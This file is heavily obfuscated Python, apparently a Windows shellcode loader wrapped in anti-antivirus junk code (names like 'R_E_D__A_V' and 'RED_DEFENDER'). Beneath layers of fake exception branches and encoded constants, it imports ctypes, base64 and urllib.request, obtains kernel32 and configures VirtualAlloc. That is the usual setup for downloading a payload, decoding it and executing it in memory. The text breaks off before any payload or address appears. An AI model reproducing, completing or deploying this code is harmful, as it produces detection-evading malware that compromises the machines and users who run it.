__8318513654777 = 0
__8318513654777 += 1
try:
    raise MemoryError(__8318513654777)
except MemoryError as __2118364679923:
    if __2118364679923.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(116) > int(35) < int(819) > int(1812))) and bool(str(str(1917) > int(311) < int(188) > int(102))) > 2 else bool
    if __2118364679923.args[0] == 3:
        __8441366278890 = 198619154277383
    if __2118364679923.args[0] == 4:
        __7168148739493 = 129083631004976
__4263318789378 = 0
__4263318789378 += 1
try:
    raise MemoryError(__4263318789378)
except MemoryError as __3495901441833:
    if __3495901441833.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(116) > int(106) < int(511) > int(1217))) and bool(str(str(1217) > int(65) < int(35) > int(148))) > 2 else str
    if __3495901441833.args[0] == 3:
        __2075898647063 = 263578722919942
    if __3495901441833.args[0] == 4:
        __7798731087201 = 90891368833678
    if __3495901441833.args[0] == 5:
        __5039974533519 = 17301072768865
    if __3495901441833.args[0] == 6:
        __2093489130275 = 134711232365460
__6359519638937 = 0
__6359519638937 += 1
try:
    raise MemoryError(__6359519638937)
except MemoryError as __4102776329489:
    if __4102776329489.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(1510) > int(123) < int(113) > int(816))) and bool(str(str(1015) > int(178) < int(175) > int(101))) > 2 else type
    if __4102776329489.args[0] == 3:
        __8119550794584 = 202750438050123
    if __4102776329489.args[0] == 4:
        __4497616403137 = 143335334200154
    if __4102776329489.args[0] == 5:
        __2616925222810 = 106746890267479
__8384235493449 = 0
__8384235493449 += 1
try:
    raise MemoryError(__8384235493449)
except MemoryError as __2226852734603:
    if __2226852734603.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(64) > int(28) < int(165) > int(317))) and bool(str(str(43) > int(1118) < int(115) > int(16))) > 2 else int
    if __2226852734603.args[0] == 3:
        __4774274964412 = 41832760982262
    if __2226852734603.args[0] == 4:
        __3838525154348 = 188739516793619
    if __2226852734603.args[0] == 5:
        __5779770612437 = 256509362859983
    if __2226852734603.args[0] == 6:
        __8291049050141 = 8037327745063
    if __2226852734603.args[0] == 7:
        __4596589169713 = 224349538197728
__6149232724831 = 0
__6149232724831 += 1
try:
    raise MemoryError(__6149232724831)
except MemoryError as __6826563148764:
    if __6826563148764.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(611) > int(43) < int(1219) > int(915))) and bool(str(str(18) > int(316) < int(127) > int(105))) > 2 else bytes
    if __6826563148764.args[0] == 3:
        __3608881282025 = 118810944712922
    if __6826563148764.args[0] == 4:
        __2537372131395 = 95227509296607
    if __6826563148764.args[0] == 5:
        __2268228890368 = 280513664283357
    if __6826563148764.args[0] == 6:
        __2173716125328 = 63372737760409
__8429573606245 = 0
__8429573606245 += 1
try:
    raise MemoryError(__8429573606245)
except MemoryError as __7922532617999:
    if __7922532617999.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(38) > int(418) < int(312) > int(1411))) and bool(str(str(311) > int(1318) < int(1410) > int(172))) > 2 else vars
    if __7922532617999.args[0] == 3:
        __4605006564781 = 3918268501
    if __7922532617999.args[0] == 4:
        __8422299557018 = 12638200972722
    if __7922532617999.args[0] == 5:
        __5458874857042 = 179367139608137
    if __7922532617999.args[0] == 6:
        __3506785824660 = 15221164934170
    if __7922532617999.args[0] == 7:
        __6410067325296 = 279587956503602
__7183657043590 = 0
__7183657043590 += 1
try:
    raise MemoryError(__7183657043590)
except MemoryError as __7622830932219:
    if __7622830932219.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(412) > int(1411) < int(213) > int(1914))) and bool(str(str(19) > int(43) < int(131) > int(183))) > 2 else callable
    if __7622830932219.args[0] == 3:
        __3738468717280 = 136929925379069
    if __7622830932219.args[0] == 4:
        __2973618227748 = 146817477365125
    if __7622830932219.args[0] == 5:
        __6321494348475 = 31742510460681
    if __7622830932219.args[0] == 6:
        __4302685713375 = 222000459974287
    if __7622830932219.args[0] == 7:
        __2520504275768 = 36772713341942
__3735059714621 = 0
__3735059714621 += 1
try:
    raise MemoryError(__3735059714621)
except MemoryError as __7847807758406:
    if __7847807758406.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(112) > int(142) < int(64) > int(83))) and bool(str(str(156) > int(1813) < int(411) > int(1715))) > 2 else eval
    if __7847807758406.args[0] == 3:
        __4676058786126 = 275202863134350
__2654882644364 = 0
__2654882644364 += 1
try:
    raise MemoryError(__2654882644364)
except MemoryError as __6154955343136:
    if __6154955343136.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(916) > int(211) < int(1819) > int(811))) and bool(str(str(1713) > int(122) < int(918) > int(1013))) > 2 else list
    if __6154955343136.args[0] == 3:
        __6147021961160 = 258283673942216
    if __6154955343136.args[0] == 4:
        __7181075965321 = 42538609927646
    if __6154955343136.args[0] == 5:
        __2594249964867 = 274851891553753
    if __6154955343136.args[0] == 6:
        __5318802693619 = 81593015187668
__6385126590969 = 0
__6385126590969 += 1
try:
    raise MemoryError(__6385126590969)
except MemoryError as __8270968015517:
    if __8270968015517.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(1017) > int(36) < int(177) > int(16))) and bool(str(str(1713) > int(1611) < int(38) > int(76))) > 2 else map
    if __8270968015517.args[0] == 3:
        __5663673743881 = 235563831087790
    if __8270968015517.args[0] == 4:
        __3192960535830 = 170535868656503
    if __8270968015517.args[0] == 5:
        __3342473073749 = 202752410886799
    if __8270968015517.args[0] == 6:
        __4366763416833 = 24771838373276
__6952065859318 = 0
__6952065859318 += 1
try:
    raise MemoryError(__6952065859318)
except MemoryError as __2793137945085:
    if __2793137945085.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(1713) > int(145) < int(93) > int(314))) and bool(str(str(171) > int(48) < int(15) > int(75))) > 2 else __import__
    if __2793137945085.args[0] == 3:
        __3879114530808 = 145217142515771
    if __2793137945085.args[0] == 4:
        __3491080333440 = 28939202480887
    if __2793137945085.args[0] == 5:
        __4141452913740 = 247188483762050
    if __2793137945085.args[0] == 6:
        __6064219000899 = 240449109487804
__7275795863531 = 0
__7275795863531 += 1
try:
    raise MemoryError(__7275795863531)
except MemoryError as __8445762941476:
    if __8445762941476.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(719) > int(81) < int(137) > int(817))) and bool(str(str(118) > int(1210) < int(167) > int(310))) > 2 else print
    if __8445762941476.args[0] == 3:
        __4335772722341 = 108983633557522
__8545787125188 = 0
__8545787125188 += 1
try:
    raise MemoryError(__8545787125188)
except MemoryError as __8119559934127:
    if __8119559934127.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(819) > int(96) < int(818) > int(1413))) and bool(str(str(87) > int(816) < int(1418) > int(411))) > 2 else input
    if __8119559934127.args[0] == 3:
        __4978457180393 = 111498551247517
    if __8119559934127.args[0] == 4:
        __7569868468191 = 61559818834868
    if __8119559934127.args[0] == 5:
        __2466101925274 = 254604218555816

def R_E_D__A_V____(RED_DEFENDER, *k):
    __7588625666761 = 0
    __7588625666761 += 1
    try:
        raise MemoryError(__7588625666761)
    except MemoryError as __5215265262024:
        if __5215265262024.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __5215265262024.args[0] == 1:
            globals()['_179'] = (lambda : (lambda _311: _311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __5215265262024.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __5215265262024.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __5215265262024.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __5215265262024.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _179:
                    globals()['R_E_D____A_V_'] += (lambda : '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda : (lambda _211: _211 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __5215265262024.args[0] == 1:
            return R_E_D____A_V
        if __5215265262024.args[0] == 9:
            __4385487430913 = 391670743720
        if __5215265262024.args[0] == 10:
            __2629459671233 = 252980946986636
        if __5215265262024.args[0] == 11:
            __2317240456107 = 6223934028257

def ______R_E_D__A_V_______(x):
    __6092058586481 = 0
    __6092058586481 += 1
    try:
        raise MemoryError(__6092058586481)
    except MemoryError as __6363974474305:
        if __6363974474305.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __6363974474305.args[0] == 3:
            __2436936438967 = 112037502151363

def R_E_D__A_V(e):
    __6712817462036 = 0
    __6712817462036 += 1
    try:
        raise MemoryError(__6712817462036)
    except MemoryError as __3092405902174:
        if __3092405902174.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __3092405902174.args[0] == 1:
            r = 0
        if __3092405902174.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __3092405902174.args[0] == 1:
            return r
        if __3092405902174.args[0] == 6:
            __4242249665870 = 63605295930650
        if __3092405902174.args[0] == 7:
            __2559505977579 = 235001762062751
        if __3092405902174.args[0] == 8:
            __5582897437864 = 14049009612351
        if __3092405902174.args[0] == 9:
            __2992447837377 = 95137004016989

def ____________________________(x):
    __5214946719433 = 0
    __5214946719433 += 1
    try:
        raise MemoryError(__5214946719433)
    except MemoryError as __7585041421599:
        if __7585041421599.args[0] == 1:
            ar = []
        if __7585041421599.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __7585041421599.args[0] == 1:
            return ar
        if __7585041421599.args[0] == 5:
            __6223673956480 = 120719202764790
        if __7585041421599.args[0] == 6:
            __6042641195984 = 36051650995636
if (lambda : (lambda _175: _175 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '126' == '151':
        case True:
            raise MemoryError([True])
        case False:
            _176 = [[True], [False]]
            R_E_D__A_V______(['_116'])
    raise MemoryError([True])
except MemoryError as _611:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _108: _108 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _126 = [[(lambda : (lambda _513: _513 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1612: _1612 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _157: _157 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _78:
        import sys
try:
    match '519' == '1213':
        case True:
            raise MemoryError([True])
        case False:
            _123 = [[True], [False]]
            R_E_D__A_V______(['_85'])
    raise MemoryError([True])
except MemoryError as _142:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _45: _45 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1413 = [[(lambda : (lambda _149: _149 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _126: _126 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _1917: _1917 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _35:
        import ctypes
try:
    match '413' == '1611':
        case True:
            raise MemoryError([True])
        case False:
            _106 = [[True], [False]]
            R_E_D__A_V______(['_918'])
    raise MemoryError([True])
except MemoryError as _103:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _410: _410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1918 = [[(lambda : (lambda _114: _114 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _87: _87 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _611: _611 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _417:
        import base64
try:
    match '38' == '1314':
        case True:
            raise MemoryError([True])
        case False:
            _85 = [[True], [False]]
            R_E_D__A_V______(['_15'])
    raise MemoryError([True])
except MemoryError as _1211:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _138: _138 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _512 = [[(lambda : (lambda _618: _618 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _58: _58 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1810: _1810 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1712:
        import ctypes.wintypes as wt
try:
    match '1112' == '1115':
        case True:
            raise MemoryError([True])
        case False:
            _18 = [[True], [False]]
            R_E_D__A_V______(['_1210'])
    raise MemoryError([True])
except MemoryError as _410:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _714: _714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1315 = [[(lambda : (lambda _144: _144 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1316: _1316 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _86: _86 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1210:
        import urllib.request
try:
    match '56' == '617':
        case True:
            raise MemoryError([True])
        case False:
            _39 = [[True], [False]]
            R_E_D__A_V______(['_112'])
    raise MemoryError([True])
except MemoryError as _172:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1312: _1312 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1115 = [[(lambda : (lambda _911: _911 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1711: _1711 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1019: _1019 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _124:
        __6226054104950 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '914' == '1910':
        case True:
            raise MemoryError([True])
        case False:
            _56 = [[True], [False]]
            R_E_D__A_V______(['_1917'])
    raise MemoryError([True])
except MemoryError as _64:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _518: _518 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1812 = [[(lambda : (lambda _1410: _1410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _21: _21 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _111: _111 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _121:
        __6226054104950 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '133' == '1614':
        case True:
            raise MemoryError([True])
        case False:
            _127 = [[True], [False]]
            R_E_D__A_V______(['_46'])
    raise MemoryError([True])
except MemoryError as _1610:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1918: _1918 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _818 = [[(lambda : (lambda _38: _38 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _178: _178 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _514: _514 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _918:
        try:
            raise MemoryError(__6226054104950)
        except MemoryError as __7327324150551:
            if __7327324150551.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __7327324150551.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2291918904793 = (lambda : R_E_D__A_V(b'R_E_D__A_V__5\xbe\x91\x9d\x00v'))()
try:
    match '54' == '18':
        case True:
            raise MemoryError([True])
        case False:
            _119 = [[True], [False]]
            R_E_D__A_V______(['_1816'])
    raise MemoryError([True])
except MemoryError as _214:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _312: _312 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _128 = [[(lambda : (lambda _1317: _1317 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _158: _158 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _46: _46 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _316:
        __7122989941434 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '716' == '175':
        case True:
            raise MemoryError([True])
        case False:
            _104 = [[True], [False]]
            R_E_D__A_V______(['_123'])
    raise MemoryError([True])
except MemoryError as _1113:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _217: _217 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _318 = [[(lambda : (lambda _1410: _1410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _104: _104 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _189:
        __7122989941434 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '174' == '35':
        case True:
            raise MemoryError([True])
        case False:
            _13 = [[True], [False]]
            R_E_D__A_V______(['_1218'])
    raise MemoryError([True])
except MemoryError as _718:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _37: _37 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _86 = [[(lambda : (lambda _126: _126 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _186: _186 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _1410: _1410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _14:
        try:
            raise MemoryError(__7122989941434)
        except MemoryError as __3959011611461:
            if __3959011611461.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __3959011611461.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3481212957480 = (lambda : R_E_D__A_V(b'R_E_D__A_V__,0\x16\xe6s\x84'))()
            if __3959011611461.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5396757468862 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x1eN\x90\xced8'))()
            if __3959011611461.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __6943234785088 = (lambda : R_E_D__A_V(b'R_E_D__A_V__r\xafc\x8aAf'))()
            if __3959011611461.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __7048389191962 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x93rb\xa4\x9f\x11'))()
try:
    match '116' == '1715':
        case True:
            raise MemoryError([True])
        case False:
            _182 = [[True], [False]]
            R_E_D__A_V______(['_181'])
    raise MemoryError([True])
except MemoryError as _117:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _111: _111 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _611 = [[(lambda : (lambda _169: _169 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _214: _214 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _108: _108 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _919:
        __7818457321908 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '138' == '619':
        case True:
            raise MemoryError([True])
        case False:
            _311 = [[True], [False]]
            R_E_D__A_V______(['_1815'])
    raise MemoryError([True])
except MemoryError as _417:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _87: _87 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _911 = [[(lambda : (lambda _1916: _1916 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1511: _1511 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
